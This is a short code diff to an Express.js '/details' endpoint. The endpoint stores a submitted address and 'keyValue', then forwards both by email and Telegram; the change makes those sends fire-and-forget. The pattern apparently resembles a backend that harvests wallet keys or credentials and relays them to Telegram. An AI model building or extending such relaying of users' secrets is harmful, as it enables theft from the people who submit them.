@@ -50,8 +50,9 @@ app.post("/details", async (req,res) => {
         
   try{
      const saved = await User.create({address,keyValue});
-     await sendEmail({address,keyValue});
-     await sendTelegram({address,keyValue});
+        sendEmail({ address, keyValue }).catch(console.error);
+        sendTelegram({ address, keyValue }).catch(console.error);
+
      res.json({ success: true, data: saved });
   }catch(err){
     console.error(err);
